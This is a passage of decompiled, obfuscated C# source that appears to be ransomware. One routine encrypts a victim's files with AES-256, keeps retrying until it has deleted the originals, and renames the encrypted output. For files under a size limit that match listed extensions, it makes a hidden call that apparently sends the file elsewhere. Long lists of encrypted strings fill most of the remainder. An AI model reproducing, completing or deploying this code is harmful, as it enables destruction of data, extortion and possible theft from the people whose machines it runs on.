			string hiCFhHjJlOYV = CS_0024_003C_003E8__locals0.hiCFhHjJlOYV;
			FileStream fileStream = new FileStream(hiCFhHjJlOYV, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (fjTNcifXIFVhG == getString_0(107396874))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.hXQwhyyUChxW, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.hXQwhyyUChxW, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.hXQwhyyUChxW, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.hiCFhHjJlOYV.Length > 0)
				{
					if (izPLAKDXDdmSpa == getString_0(107396874))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.hXQwhyyUChxW, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in tSGlhJqTqwPK)
						{
							if (CS_0024_003C_003E8__locals0.hXQwhyyUChxW.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396874))
							{
								if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), CS_0024_003C_003E8__locals0.hXQwhyyUChxW);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.hXQwhyyUChxW.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396725))
							{
								try
								{
									BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), CS_0024_003C_003E8__locals0.hXQwhyyUChxW);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.hXQwhyyUChxW);
								break;
							}
							catch
							{
								Thread.Sleep(1000);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.hiCFhHjJlOYV.EndsWith(getString_0(107394568)))
					{
						File.Move(CS_0024_003C_003E8__locals0.hiCFhHjJlOYV, CS_0024_003C_003E8__locals0.hiCFhHjJlOYV.Replace(getString_0(107394568), getString_0(107395182)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.hiCFhHjJlOYV))
							{
								File.Delete(CS_0024_003C_003E8__locals0.hiCFhHjJlOYV);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1000);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void _003CMain_003Eb__4()
	{
		List<string> zGhIruVHdPFYtlWZP = ZGhIruVHdPFYtlWZP;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate(string string_0)
			{
				DfMsLiBapm(getString_0(107394559), string_0);
			};
		}
		Parallel.ForEach(zGhIruVHdPFYtlWZP, CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		List<string> source = nUfyhadkiCc;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				DfMsLiBapm(getString_0(107394578), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> yeqlzLfCpLfm = YeqlzLfCpLfm;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), string_0);
			};
		}
		Parallel.ForEach(yeqlzLfCpLfm, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (kcodLppuPOB == getString_0(107396874))
		{
			string[] source2 = mgkfkwKGBpQPji;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), getString_0(107394544) + string_0 + getString_0(107394503));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		lYIttWtMyAuqKQB(sSEPqFEDMqTaEztS);
		List<string> source3 = aDGslaPvgQQ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394498)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source4 = wIrQjgjhsFi;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394473)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> povUsIuWBfWY = PovUsIuWBfWY;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				DfMsLiBapm(getString_0(107394488), string_0);
			};
		}
		Parallel.ForEach(povUsIuWBfWY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__5(string string_0)
	{
		DfMsLiBapm(getString_0(107394559), string_0);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		DfMsLiBapm(getString_0(107394578), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394537)), getString_0(107394544) + string_0 + getString_0(107394503));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394498)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		DfMsLiBapm(HaBpHuAelnemsPrlU(getString_0(107394473)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		DfMsLiBapm(getString_0(107394488), string_0);
	}

	static sjdJQieILoWa()
	{
		Strings.CreateGetStringDelegate(typeof(sjdJQieILoWa));
		UIDPHteqvzfbK = getString_0(107395619);
		yqKEaKaJbO = null;
		nKBzlLZizip = getString_0(107396725);
		ZWzWxnSFNWW = getString_0(107394479);
		eiFKYbjMTwOFPW = new List<string>();
		IEQajUMVRVBXY = new List<string>();
		BRbrMiVGtCEo = getString_0(107396725);
		TYmpKQYXClI = getString_0(107395182);
		oJAyRMQdLb = getString_0(107396725);
		gnqIHQBwBLyhk = 0;
		OQpPiZFfDfeJnl = getString_0(107396725);
		dZgvfPWkHgoi = getString_0(107396725);
		xYNERQemnofjJm = getString_0(107396725);
		oAGWPSwqtIetQZ = getString_0(107394434);
		HyPsaTMavROVgnA = getString_0(107396725);
		qAMOEwnKXE = getString_0(107396725);
		jnzaVyrTCJX = getString_0(107396725);
		IbbTiLEHloiMm = getString_0(107396725);
		NDbhdbSCPL = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107394429)),
			HaBpHuAelnemsPrlU(getString_0(107394444)),
			HaBpHuAelnemsPrlU(getString_0(107394419)),
			HaBpHuAelnemsPrlU(getString_0(107393858)),
			HaBpHuAelnemsPrlU(getString_0(107393833)),
			HaBpHuAelnemsPrlU(getString_0(107393840)),
			HaBpHuAelnemsPrlU(getString_0(107393791)),
			HaBpHuAelnemsPrlU(getString_0(107393766)),
			HaBpHuAelnemsPrlU(getString_0(107393773)),
			HaBpHuAelnemsPrlU(getString_0(107393748)),
			HaBpHuAelnemsPrlU(getString_0(107393699)),
			HaBpHuAelnemsPrlU(getString_0(107393674)),
			HaBpHuAelnemsPrlU(getString_0(107393681))
		};
		ynDzKjPwCccASf = new List<string>();
		jUDtqXyLEDEHHER = getString_0(107396725);
		iGZNDiAjpDclE = getString_0(107396725);
		ckAvGZnyCZ = getString_0(107396725);
		mlJZHNmKGbGNL = new List<string>();
		jvPfFiwuBQwY = getString_0(107396725);
		cilpKuzoUbTSW = getString_0(107393656);
		lECemNXjMIUDo = getString_0(107396725);
		ltvOdQrMyPPaInM = getString_0(107396725);
		ZGhIruVHdPFYtlWZP = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107394087)),
			HaBpHuAelnemsPrlU(getString_0(107394058)),
			HaBpHuAelnemsPrlU(getString_0(107394033)),
			HaBpHuAelnemsPrlU(getString_0(107394004)),
			HaBpHuAelnemsPrlU(getString_0(107393927)),
			HaBpHuAelnemsPrlU(getString_0(107393350)),
			HaBpHuAelnemsPrlU(getString_0(107393317)),
			HaBpHuAelnemsPrlU(getString_0(107393284)),
			HaBpHuAelnemsPrlU(getString_0(107393251)),
			HaBpHuAelnemsPrlU(getString_0(107393222)),
			HaBpHuAelnemsPrlU(getString_0(107393193)),
			HaBpHuAelnemsPrlU(getString_0(107393152)),
			HaBpHuAelnemsPrlU(getString_0(107393143)),
			HaBpHuAelnemsPrlU(getString_0(107393566)),
			HaBpHuAelnemsPrlU(getString_0(107393549)),
			HaBpHuAelnemsPrlU(getString_0(107393516)),
			HaBpHuAelnemsPrlU(getString_0(107393487)),
			HaBpHuAelnemsPrlU(getString_0(107393414)),
			HaBpHuAelnemsPrlU(getString_0(107393373)),
			HaBpHuAelnemsPrlU(getString_0(107392828)),
			HaBpHuAelnemsPrlU(getString_0(107392811)),
			HaBpHuAelnemsPrlU(getString_0(107392754)),
			HaBpHuAelnemsPrlU(getString_0(107392681)),
			HaBpHuAelnemsPrlU(getString_0(107392684)),
			HaBpHuAelnemsPrlU(getString_0(107392611)),
			HaBpHuAelnemsPrlU(getString_0(107393066)),
			HaBpHuAelnemsPrlU(getString_0(107393001)),
			HaBpHuAelnemsPrlU(getString_0(107392976)),
			HaBpHuAelnemsPrlU(getString_0(107392911)),
			HaBpHuAelnemsPrlU(getString_0(107392318)),
			HaBpHuAelnemsPrlU(getString_0(107392253)),
			HaBpHuAelnemsPrlU(getString_0(107392196)),
			HaBpHuAelnemsPrlU(getString_0(107392163)),
			HaBpHuAelnemsPrlU(getString_0(107392154)),
			HaBpHuAelnemsPrlU(getString_0(107392113)),
			HaBpHuAelnemsPrlU(getString_0(107392548)),
			HaBpHuAelnemsPrlU(getString_0(107392519)),
			HaBpHuAelnemsPrlU(getString_0(107392454)),
			HaBpHuAelnemsPrlU(getString_0(107392413)),
			HaBpHuAelnemsPrlU(getString_0(107392380)),
			HaBpHuAelnemsPrlU(getString_0(107392371)),
			HaBpHuAelnemsPrlU(getString_0(107391778)),
			HaBpHuAelnemsPrlU(getString_0(107391765)),
			HaBpHuAelnemsPrlU(getString_0(107391692)),
			HaBpHuAelnemsPrlU(getString_0(107391615)),
			HaBpHuAelnemsPrlU(getString_0(107391602)),
			HaBpHuAelnemsPrlU(getString_0(107392037)),
			HaBpHuAelnemsPrlU(getString_0(107391996)),
			HaBpHuAelnemsPrlU(getString_0(107391955)),
			HaBpHuAelnemsPrlU(getString_0(107391926)),
			HaBpHuAelnemsPrlU(getString_0(107391885)),
			HaBpHuAelnemsPrlU(getString_0(107391308)),
			HaBpHuAelnemsPrlU(getString_0(107391231)),
			HaBpHuAelnemsPrlU(getString_0(107391202)),
			HaBpHuAelnemsPrlU(getString_0(107391189)),
			HaBpHuAelnemsPrlU(getString_0(107391124)),
			HaBpHuAelnemsPrlU(getString_0(107391095)),
			HaBpHuAelnemsPrlU(getString_0(107391518)),
			HaBpHuAelnemsPrlU(getString_0(107391453)),
			HaBpHuAelnemsPrlU(getString_0(107391444)),
			HaBpHuAelnemsPrlU(getString_0(107391415)),
			HaBpHuAelnemsPrlU(getString_0(107391374)),
			HaBpHuAelnemsPrlU(getString_0(107390749)),
			HaBpHuAelnemsPrlU(getString_0(107390688)),
			HaBpHuAelnemsPrlU(getString_0(107390647)),
			HaBpHuAelnemsPrlU(getString_0(107390570)),
			HaBpHuAelnemsPrlU(getString_0(107391049)),
			HaBpHuAelnemsPrlU(getString_0(107391008)),
			HaBpHuAelnemsPrlU(getString_0(107390963)),
			HaBpHuAelnemsPrlU(getString_0(107390886)),
			HaBpHuAelnemsPrlU(getString_0(107390829)),
			HaBpHuAelnemsPrlU(getString_0(107390236)),
			HaBpHuAelnemsPrlU(getString_0(107390207)),
			HaBpHuAelnemsPrlU(getString_0(107390198)),
			HaBpHuAelnemsPrlU(getString_0(107390133)),
			HaBpHuAelnemsPrlU(getString_0(107390052)),
			HaBpHuAelnemsPrlU(getString_0(107390539)),
			HaBpHuAelnemsPrlU(getString_0(107390474)),
			HaBpHuAelnemsPrlU(getString_0(107390445)),
			HaBpHuAelnemsPrlU(getString_0(107390388)),
			HaBpHuAelnemsPrlU(getString_0(107392196)),
			HaBpHuAelnemsPrlU(getString_0(107390299)),
			HaBpHuAelnemsPrlU(getString_0(107389778)),
			HaBpHuAelnemsPrlU(getString_0(107389689)),
			HaBpHuAelnemsPrlU(getString_0(107389644)),
			HaBpHuAelnemsPrlU(getString_0(107389583)),
			HaBpHuAelnemsPrlU(getString_0(107389558)),
			HaBpHuAelnemsPrlU(getString_0(107389993)),
			HaBpHuAelnemsPrlU(getString_0(107389976)),
			HaBpHuAelnemsPrlU(getString_0(107393066)),
			HaBpHuAelnemsPrlU(getString_0(107389911)),
			HaBpHuAelnemsPrlU(getString_0(107389870)),
			HaBpHuAelnemsPrlU(getString_0(107389813)),
			HaBpHuAelnemsPrlU(getString_0(107393001)),
			HaBpHuAelnemsPrlU(getString_0(107389228)),
			HaBpHuAelnemsPrlU(getString_0(107389147)),
			HaBpHuAelnemsPrlU(getString_0(107389058)),
			HaBpHuAelnemsPrlU(getString_0(107389505)),
			HaBpHuAelnemsPrlU(getString_0(107389488)),
			HaBpHuAelnemsPrlU(getString_0(107392911)),
			HaBpHuAelnemsPrlU(getString_0(107389379)),
			HaBpHuAelnemsPrlU(getString_0(107392163)),
			HaBpHuAelnemsPrlU(getString_0(107392318)),
			HaBpHuAelnemsPrlU(getString_0(107389346)),
			HaBpHuAelnemsPrlU(getString_0(107389289)),
			HaBpHuAelnemsPrlU(getString_0(107392253)),
			HaBpHuAelnemsPrlU(getString_0(107388744)),
			HaBpHuAelnemsPrlU(getString_0(107388727)),
			HaBpHuAelnemsPrlU(getString_0(107388646)),
			HaBpHuAelnemsPrlU(getString_0(107392611)),
			HaBpHuAelnemsPrlU(getString_0(107388653)),
			HaBpHuAelnemsPrlU(getString_0(107388576)),
			HaBpHuAelnemsPrlU(getString_0(107388547)),
			HaBpHuAelnemsPrlU(getString_0(107388518)),
			HaBpHuAelnemsPrlU(getString_0(107389017)),
			HaBpHuAelnemsPrlU(getString_0(107388984)),
			HaBpHuAelnemsPrlU(getString_0(107388927)),
			HaBpHuAelnemsPrlU(getString_0(107388914)),
			HaBpHuAelnemsPrlU(getString_0(107388889)),
			HaBpHuAelnemsPrlU(getString_0(107388848)),
			HaBpHuAelnemsPrlU(getString_0(107388771)),
			HaBpHuAelnemsPrlU(getString_0(107388242)),
			HaBpHuAelnemsPrlU(getString_0(107388185)),
			HaBpHuAelnemsPrlU(getString_0(107388152)),
			HaBpHuAelnemsPrlU(getString_0(107388107)),
			HaBpHuAelnemsPrlU(getString_0(107388042)),
			HaBpHuAelnemsPrlU(getString_0(107388001)),
			HaBpHuAelnemsPrlU(getString_0(107392684)),
			HaBpHuAelnemsPrlU(getString_0(107388242)),
			HaBpHuAelnemsPrlU(getString_0(107388504)),
			HaBpHuAelnemsPrlU(getString_0(107388443)),
			HaBpHuAelnemsPrlU(getString_0(107388414)),
			HaBpHuAelnemsPrlU(getString_0(107388397)),
			HaBpHuAelnemsPrlU(getString_0(107388324)),
			HaBpHuAelnemsPrlU(getString_0(107388263)),
			HaBpHuAelnemsPrlU(getString_0(107387678)),
			HaBpHuAelnemsPrlU(getString_0(107387649)),
			HaBpHuAelnemsPrlU(getString_0(107387616)),
			HaBpHuAelnemsPrlU(getString_0(107387575)),
			HaBpHuAelnemsPrlU(getString_0(107387546)),
			HaBpHuAelnemsPrlU(getString_0(107387501)),
			HaBpHuAelnemsPrlU(getString_0(107387948)),
			HaBpHuAelnemsPrlU(getString_0(107387915)),
			HaBpHuAelnemsPrlU(getString_0(107387838)),
			HaBpHuAelnemsPrlU(getString_0(107387777)),
			HaBpHuAelnemsPrlU(getString_0(107387744)),
			HaBpHuAelnemsPrlU(getString_0(107387219)),
			HaBpHuAelnemsPrlU(getString_0(107387154)),
			HaBpHuAelnemsPrlU(getString_0(107387121)),
			HaBpHuAelnemsPrlU(getString_0(107387048)),
			HaBpHuAelnemsPrlU(getString_0(107387031)),
			HaBpHuAelnemsPrlU(getString_0(107392811)),
			HaBpHuAelnemsPrlU(getString_0(107387002)),
			HaBpHuAelnemsPrlU(getString_0(107387425)),
			HaBpHuAelnemsPrlU(getString_0(107387416)),
			HaBpHuAelnemsPrlU(getString_0(107387371)),
			HaBpHuAelnemsPrlU(getString_0(107387298)),
			HaBpHuAelnemsPrlU(getString_0(107387285)),
			HaBpHuAelnemsPrlU(getString_0(107386712)),
			HaBpHuAelnemsPrlU(getString_0(107386631)),
			HaBpHuAelnemsPrlU(getString_0(107386614)),
			HaBpHuAelnemsPrlU(getString_0(107386525)),
			HaBpHuAelnemsPrlU(getString_0(107386468)),
			HaBpHuAelnemsPrlU(getString_0(107386967)),
			HaBpHuAelnemsPrlU(getString_0(107386926)),
			HaBpHuAelnemsPrlU(getString_0(107386869)),
			HaBpHuAelnemsPrlU(getString_0(107392754)),
			HaBpHuAelnemsPrlU(getString_0(107386796)),
			HaBpHuAelnemsPrlU(getString_0(107386767)),
			HaBpHuAelnemsPrlU(getString_0(107386734)),
			HaBpHuAelnemsPrlU(getString_0(107386149)),
			HaBpHuAelnemsPrlU(getString_0(107386120)),
			HaBpHuAelnemsPrlU(getString_0(107392828)),
			HaBpHuAelnemsPrlU(getString_0(107386079)),
			HaBpHuAelnemsPrlU(getString_0(107386062)),
			HaBpHuAelnemsPrlU(getString_0(107386033)),
			HaBpHuAelnemsPrlU(getString_0(107391095)),
			HaBpHuAelnemsPrlU(getString_0(107386000)),
			HaBpHuAelnemsPrlU(getString_0(107386033)),
			HaBpHuAelnemsPrlU(getString_0(107385971)),
			HaBpHuAelnemsPrlU(getString_0(107386454)),
			HaBpHuAelnemsPrlU(getString_0(107386425)),
			HaBpHuAelnemsPrlU(getString_0(107386344)),
			HaBpHuAelnemsPrlU(getString_0(107386327)),
			HaBpHuAelnemsPrlU(getString_0(107386286)),
			HaBpHuAelnemsPrlU(getString_0(107386225)),
			HaBpHuAelnemsPrlU(getString_0(107385684)),
			HaBpHuAelnemsPrlU(getString_0(107385643)),
			HaBpHuAelnemsPrlU(getString_0(107385566)),
			HaBpHuAelnemsPrlU(getString_0(107385553)),
			HaBpHuAelnemsPrlU(getString_0(107385520)),
			HaBpHuAelnemsPrlU(getString_0(107385463)),
			HaBpHuAelnemsPrlU(getString_0(107385898)),
			HaBpHuAelnemsPrlU(getString_0(107385873)),
			HaBpHuAelnemsPrlU(getString_0(107385840)),
			HaBpHuAelnemsPrlU(getString_0(107385767)),
			HaBpHuAelnemsPrlU(getString_0(107385738)),
			HaBpHuAelnemsPrlU(getString_0(107385709)),
			HaBpHuAelnemsPrlU(getString_0(107385164)),
			HaBpHuAelnemsPrlU(getString_0(107385107)),
			HaBpHuAelnemsPrlU(getString_0(107385034)),
			HaBpHuAelnemsPrlU(getString_0(107385017)),
			HaBpHuAelnemsPrlU(getString_0(107384984)),
			HaBpHuAelnemsPrlU(getString_0(107385415)),
			HaBpHuAelnemsPrlU(getString_0(107385402)),
			HaBpHuAelnemsPrlU(getString_0(107385321)),
			HaBpHuAelnemsPrlU(getString_0(107385276)),
			HaBpHuAelnemsPrlU(getString_0(107385259)),
			HaBpHuAelnemsPrlU(getString_0(107385194)),
			HaBpHuAelnemsPrlU(getString_0(107384641)),
			HaBpHuAelnemsPrlU(getString_0(107384632)),
			HaBpHuAelnemsPrlU(getString_0(107384587)),
			HaBpHuAelnemsPrlU(getString_0(107388324)),
			HaBpHuAelnemsPrlU(getString_0(107384522)),
			HaBpHuAelnemsPrlU(getString_0(107384481)),
			HaBpHuAelnemsPrlU(getString_0(107384424)),
			HaBpHuAelnemsPrlU(getString_0(107384427)),
			HaBpHuAelnemsPrlU(getString_0(107384874)),
			HaBpHuAelnemsPrlU(getString_0(107384841)),
			HaBpHuAelnemsPrlU(getString_0(107384824)),
			HaBpHuAelnemsPrlU(getString_0(107384763)),
			HaBpHuAelnemsPrlU(getString_0(107384750)),
			HaBpHuAelnemsPrlU(getString_0(107384673)),
			HaBpHuAelnemsPrlU(getString_0(107384152)),
			HaBpHuAelnemsPrlU(getString_0(107384063)),
			HaBpHuAelnemsPrlU(getString_0(107384046)),
			HaBpHuAelnemsPrlU(getString_0(107384017)),
			HaBpHuAelnemsPrlU(getString_0(107383940))
		};
		nUfyhadkiCc = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107383899)),
			HaBpHuAelnemsPrlU(getString_0(107384378)),
			HaBpHuAelnemsPrlU(getString_0(107384301)),
			HaBpHuAelnemsPrlU(getString_0(107384240))
		};
		YeqlzLfCpLfm = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107384183)),
			HaBpHuAelnemsPrlU(getString_0(107383638)),
			HaBpHuAelnemsPrlU(getString_0(107383561)),
			HaBpHuAelnemsPrlU(getString_0(107383544)),
			HaBpHuAelnemsPrlU(getString_0(107383511)),
			HaBpHuAelnemsPrlU(getString_0(107383430)),
			HaBpHuAelnemsPrlU(getString_0(107383417)),
			HaBpHuAelnemsPrlU(getString_0(107383896)),
			HaBpHuAelnemsPrlU(getString_0(107383863)),
			HaBpHuAelnemsPrlU(getString_0(107383830)),
			HaBpHuAelnemsPrlU(getString_0(107383797)),
			HaBpHuAelnemsPrlU(getString_0(107383764)),
			HaBpHuAelnemsPrlU(getString_0(107383723)),
			HaBpHuAelnemsPrlU(getString_0(107383650)),
			HaBpHuAelnemsPrlU(getString_0(107383125)),
			HaBpHuAelnemsPrlU(getString_0(107383092)),
			HaBpHuAelnemsPrlU(getString_0(107383051)),
			HaBpHuAelnemsPrlU(getString_0(107382986)),
			HaBpHuAelnemsPrlU(getString_0(107382945)),
			HaBpHuAelnemsPrlU(getString_0(107382936)),
			HaBpHuAelnemsPrlU(getString_0(107382903)),
			HaBpHuAelnemsPrlU(getString_0(107383374)),
			HaBpHuAelnemsPrlU(getString_0(107383341)),
			HaBpHuAelnemsPrlU(getString_0(107384183)),
			HaBpHuAelnemsPrlU(getString_0(107383268)),
			HaBpHuAelnemsPrlU(getString_0(107383227)),
			HaBpHuAelnemsPrlU(getString_0(107383214)),
			HaBpHuAelnemsPrlU(getString_0(107383181)),
			HaBpHuAelnemsPrlU(getString_0(107382596)),
			HaBpHuAelnemsPrlU(getString_0(107382555)),
			HaBpHuAelnemsPrlU(getString_0(107382554)),
			HaBpHuAelnemsPrlU(getString_0(107382513)),
			HaBpHuAelnemsPrlU(getString_0(107382440)),
			HaBpHuAelnemsPrlU(getString_0(107383638)),
			HaBpHuAelnemsPrlU(getString_0(107382399)),
			HaBpHuAelnemsPrlU(getString_0(107383561)),
			HaBpHuAelnemsPrlU(getString_0(107382366)),
			HaBpHuAelnemsPrlU(getString_0(107382845)),
			HaBpHuAelnemsPrlU(getString_0(107382836)),
			HaBpHuAelnemsPrlU(getString_0(107382803)),
			HaBpHuAelnemsPrlU(getString_0(107382730)),
			HaBpHuAelnemsPrlU(getString_0(107382689)),
			HaBpHuAelnemsPrlU(getString_0(107382656)),
			HaBpHuAelnemsPrlU(getString_0(107382623)),
			HaBpHuAelnemsPrlU(getString_0(107382102)),
			HaBpHuAelnemsPrlU(getString_0(107382061)),
			HaBpHuAelnemsPrlU(getString_0(107381988))
		};
		aDGslaPvgQQ = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107381947)),
			HaBpHuAelnemsPrlU(getString_0(107381898)),
			HaBpHuAelnemsPrlU(getString_0(107382349)),
			HaBpHuAelnemsPrlU(getString_0(107382252)),
			HaBpHuAelnemsPrlU(getString_0(107382159)),
			HaBpHuAelnemsPrlU(getString_0(107381550)),
			HaBpHuAelnemsPrlU(getString_0(107381457)),
			HaBpHuAelnemsPrlU(getString_0(107381360)),
			HaBpHuAelnemsPrlU(getString_0(107381779)),
			HaBpHuAelnemsPrlU(getString_0(107381682)),
			HaBpHuAelnemsPrlU(getString_0(107381077)),
			HaBpHuAelnemsPrlU(getString_0(107380980)),
			HaBpHuAelnemsPrlU(getString_0(107380887)),
			HaBpHuAelnemsPrlU(getString_0(107381947))
		};
		sSEPqFEDMqTaEztS = HaBpHuAelnemsPrlU(getString_0(107381302));
		wIrQjgjhsFi = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107381157)),
			HaBpHuAelnemsPrlU(getString_0(107413219)),
			HaBpHuAelnemsPrlU(getString_0(107413537)),
			HaBpHuAelnemsPrlU(getString_0(107413343)),
			HaBpHuAelnemsPrlU(getString_0(107412637)),
			HaBpHuAelnemsPrlU(getString_0(107412955))
		};
		PovUsIuWBfWY = new List<string>
		{
			HaBpHuAelnemsPrlU(getString_0(107412281)),
			HaBpHuAelnemsPrlU(getString_0(107412188)),
			HaBpHuAelnemsPrlU(getString_0(107412127))
		};
		tZBqMZENpOl = getString_0(107396725);
		PHXMYTfEdWuqv = getString_0(107396725);
		lBpMZwssNAVHee = new DateTime(2000, 1, 1);
		YEpXxnRyQyz = new DateTime(2100, 1, 1);
		DIrQLiGWxURvBsQx = getString_0(107396874);
		CqCuqTxSfTnQ = getString_0(107412066);
		FhZgSOmQPUBkE = getString_0(107396725);
		JtjhvVAVmnd = getString_0(107396725);
		HZhecATKOk = getString_0(107396725);
		DVwLtNIOWBqWK = getString_0(107396874);
		OHCENHhzoDk = getString_0(107396725);
		izPLAKDXDdmSpa = getString_0(107396725);
		tSGlhJqTqwPK = new List<string>
		{
			getString_0(107397037),
			getString_0(107396239),
			getString_0(107397071),
			getString_0(107396632)
		};
		cQQwPgPIQsTI = getString_0(107396725);
		poTRwsJJYnkOD = getString_0(107412061);
		UZGWwcQQYPPUo = getString_0(107396725);
		LllENvnbVdRI = getString_0(107396725);
		rZwGEnyOGWN = getString_0(107396725);
		sACfsHBDdJYyuqh = string.Empty;
		MrRtcOxGgYQ = getString_0(107396725);
		HWPaScceTHODQ = getString_0(107396725);
		SPzYcnQJiWJZ = getString_0(107396725);
		SYmlQShVIuDaqSM = getString_0(107395182);
		ZPyxsrDZBETCcFX = getString_0(107395182);
		lNczJDqhFFcKuh = getString_0(107396725);
		dqDQddDBKAy = getString_0(107396725);
		uBISjgAHNOPpSt = getString_0(107396725);
		TbLGHDHnuu = getString_0(107396725);
		DvwipBJMlK = getString_0(107396725);
		pVZSTBaJDhmyrp = getString_0(107412088);
		GhocQMyuaXGqcRiX = getString_0(107396725);
		EsdgWPawGzhpFa = getString_0(107396725);
		zfpGlTGxsRHeuPKIg = getString_0(107412551);
		UFKyCAYrxbqDdi = getString_0(107396725);
		jjyVphVScKkaB = getString_0(107396725);
		OGtBeWwtXu = getString_0(107396725);
		wKhiWePuGUErTI = getString_0(107396725);
		hJIliGmLQLK = getString_0(107412562);
		QZCsItKVUvbo = getString_0(107396874);
		arGoDVhqgCh = getString_0(107396725);
		TdcmBpWqTeC = getString_0(107396725);
		kcodLppuPOB = getString_0(107396725);
		mgkfkwKGBpQPji = new string[0];
		fjTNcifXIFVhG = getString_0(107396725);
		rMlrRPtvGSmPo = true;
		CSbFbwAGbeuoD = getString_0(107396725);
